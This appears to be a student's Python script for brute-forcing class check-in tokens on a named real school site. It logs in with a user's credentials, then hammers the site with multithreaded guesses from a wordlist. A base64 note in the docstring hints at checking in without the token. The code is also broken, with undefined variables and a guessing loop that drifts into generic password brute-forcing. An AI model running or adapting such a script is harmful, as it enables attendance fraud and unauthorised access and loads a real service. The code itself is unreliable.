#!/usr/bin/env python3

"""Brute Force Checkin module

#!Disclaimer: 

    The network administrator will see the spike in network 
    requests. Not only will you potentially slow down 
    services for your classmates but also be very obvious
    as to who is trying/succeeds in using brute-force to check-in to class. 
    You are in control of your own actions and will face the consequences 
    if used for maliscious intention. This script is for the curious 
    and more proof of concept.
    
Hypothetical: 
        
    VGhlcmUgbWF5IGV4aXN0IGEgd2F5IG9
    mIGNoZWNraW5nIGluIHdpdGhvdXQga2
    5vd2luZyB0aGUgdG9rZW4gKG5vdCB1c
    2luZyBicnV0ZSBmb3JjZSkuLi4uaWYg
    eW91IGp1c3QgbG9vayBpbiB0aGUgcml
    naHQgcGxhY2VzLiA7KSA=
        
"""

from html.parser import HTMLParser
import urllib.request
import urllib.parse
import http.cookiejar
import queue
import threading
import sys
import os
import requests
from lxml import html, etree


__author__ = 'Gary Frederick'  # main contributor
__latest_editor__ = None  # last user to edit document
__date__ = 'November 26, 2019'  # last date edited
__version__ = 0.1  # version number

threads = 5
resume_word = None
login_url = "https://makeschool.com/login/"
dashboard_url = "https://makeschool.com/dashboard/"


# Takes a word file and builds a word queue object. You can resume a word in the file
# by modifying the resume_word value in the script


def build_token_q(file):
    # open the word list
    fd = open(file, "rb")
    # create the wordlist from the file
    word_list = fd.readlines()
    fd.close()
    # create token queue
    token_q = queue.Queue()

    if len(word_list):
        if not resume_word:
            for word in word_list:
                token = token.decode("utf-8").rstrip()
                token_q.put(token)
        else:
            resume_found = False
            for word in word_list:
                token = token.decode("utf-8").rstrip()
                if token == resume_word:
                    resume_found = True
                    token_q.put(token)
                else:
                    if resume_found:
                        token_q.put(token)
        return token_q


class BruteForcer():
    """ The BruteForcer class, can perform the following:
        1 - Log the user into MakeSchool site establishing secure connection
        2 - Pull out a token from the token queue
        3 - Performs a GET request on the makeschool shortlink with the retrieved token from the Queue
        4 - Retrieve the resulting HTML page banner message. If the page has the correct banner message
            we assume Brute-Force is successful. Otherwise, repeat the whole process with
            the next token in the queue
    """

    def __init__(self, token_q):
        self.email
        self.password
        self.token_q = token_q
        self.found = False
        self.adapter = requests.Session()
        self.session = None

    def login(self, adapter):
        # set the HTTP adapter
        adapter = self.adapter
        # HTTP GET request to login url
        login = adapter.get(login_url)  # get the login HTML
        # check to see if the response is OK
        if login.status_code == 200:
            # parse the HTML returing the login document
            login_html = html.fromstring(login.text)
            # Grab hidden form fileds by looking through HTML XPath
            hidden_inputs = login_html.xpath(
                r'//form//input[@type="hidden"]')
            # inside the form look for name and value fields to get authenticity token
            form = {x.attrib["name"]: x.attrib["value"] for x in hidden_inputs}
            # set the form email value
            form['user[email]'] = self.email
            # set the form password value
            form['user[password]'] = self.password
            # setup HTTP POST request to login url with new data inserted into form
            # and store the session
            self.session = adapter.post(login_url, data=form)
        else:
            # otherwise retry connection to server
            print('Retrying to connect to server')

    def html_brute_forcer(self):
        # cycle through all tokens
        while not token_q.empty() and not self.found:
            # check to see if there exists an active session if not create one

            # Enable cookies for the session
            cookiejar = http.cookiejar.FileCookieJar("cookies")
            opener = urllib.request.build_opener(
                urllib.request.HTTPCookieProcessor(cookiejar))

            # This allows urlopen to use cookiejar
            urllib.request.install_opener(opener)

            request = urllib.request.Request(login_url, headers=headers)
            response = urllib.request.urlopen(request)

            # The response is in bytes. Convert to string and remove b''
            page = str(response.read())[2:-1]

            # Parse HTML Form
            parsed_html = BruteParser()
            parsed_html.feed(page)

            if username_field in parsed_html.parsed_results.keys() and password_field in parsed_html.parsed_results.keys():
                parsed_html.parsed_results[username_field] = self.username
                parsed_html.parsed_results[password_field] = self.passwd_q.get(
                )

                print(
                    f"[*] Attempting {self.username}/{parsed_html.parsed_results[password_field]}")

                # Must be bytes
                post_data = urllib.parse.urlencode(
                    parsed_html.parsed_results).encode()

                brute_force_request = urllib.request.Request(
                    post_url, headers=headers)
                brute_force_response = urllib.request.urlopen(
                    brute_force_request, data=post_data)

                # The response is in bytes. Convert to string and remove b''
                brute_force_page = str(brute_force_response.read())[2:-1]

                # Parse HTML Form
                brute_force_parsed_html = BruteParser()
                brute_force_parsed_html.feed(brute_force_page)

                if not brute_force_parsed_html.parsed_results:
                    self.found = True
                    print("[*] Brute-Force Attempt is Successful!")
                    print(f"[*] Username: {self.username}")
                    print(
                        f"[*] Password: {parsed_html.parsed_results[password_field]}")
                    print("[*] Done")
                    os._exit(0)
            else:
                print("[!] HTML Page is Invalid")
                break

    # Brute-Forcing with multiple threads
    def html_brute_forcer_thread_starter(self):
        print(f"[*] Brute-Forcing with {threads} threads")
        for i in range(threads):
            html_brute_forcer_thread = threading.Thread(
                target=self.html_brute_forcer)
            html_brute_forcer_thread.start()

# An instance of this class allows for parsing the HTML page looking for username
# and password fields as part of the input form. self.parsed_results should contain
# username and password keys


class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.parsed_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            for name, value in attrs:
                if name == "name" and value == username_field:
                    self.parsed_results[username_field] = username_field
                if name == "name" and value == password_field:
                    self.parsed_results[password_field] = password_field


print("[*] Started HTML Form Brute-Forcer Script")
print("[*] Building Token Queue")
token_q = build_token_q("./wordlist/words.txt")
if token_q.qsize():
    print("[*] Password Queue Build Successful")
    attempt_brute_force = BruteForcer(token_q)
    attempt_brute_force.html_brute_forcer_thread_starter()
else:
    print("[!] Empty Password File!")
    sys.exit(0)
